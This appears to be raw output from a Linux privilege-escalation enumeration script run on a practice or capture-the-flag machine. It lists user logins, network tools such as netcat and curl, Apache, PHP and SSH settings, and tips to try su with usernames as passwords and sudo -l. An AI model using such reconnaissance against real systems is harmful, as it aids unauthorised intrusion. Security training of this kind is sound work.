wtmp begins Thu Dec  3 01:34:30 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Thu Dec  3 03:25:38 +0000 2020
will             tty1                      Sat Dec 12 15:26:04 +0000 2020
mat              pts/1    192.168.153.128  Thu Dec  3 02:48:57 +0000 2020
toby             pts/1    192.168.153.128  Thu Dec  3 02:40:13 +0000 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2020-08-12T21:33:25
httpd Not Found

Nginx version: nginx Not Found

/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Dec  3  2020 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Dec  3  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>

-rw-r--r-- 1 root root 1451 Dec  3  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
lrwxrwxrwx 1 root root 35 Dec  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>

-rw-r--r-- 1 root root 71817 Oct  7  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Oct  7  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Dec  3  2020 /etc/ldap

╔══════════╣ Searching ssl/ssh files
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/var/lib/lxd/server.crt
2486PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow

Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Dec  3  2020 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6

/tmp/tmux-1000
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jun  3  2020 /etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug  6  2020 /usr/share/keyrings

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Sep 17  2020 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 mat mat 4096 Dec  3  2020 /home/mat/.gnupg
drwx------ 3 toby toby 4096 Dec  3  2020 /home/toby/.gnupg
drwx------ 3 will will 4096 Dec  3  2020 /home/will/.gnupg

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix

╔══════════╣ Analyzing FTP Files (limit 70)

-rw-r--r-- 1 root root 69 Oct  7  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct  7  2020 /usr/share/php7.2-common/common/ftp.ini

╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind

╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 40588 Mar 15 21:35 /var/log/apache2/access.log

-rw-r----- 1 root adm 8400 Mar 15 21:35 /var/log/apache2/error.log

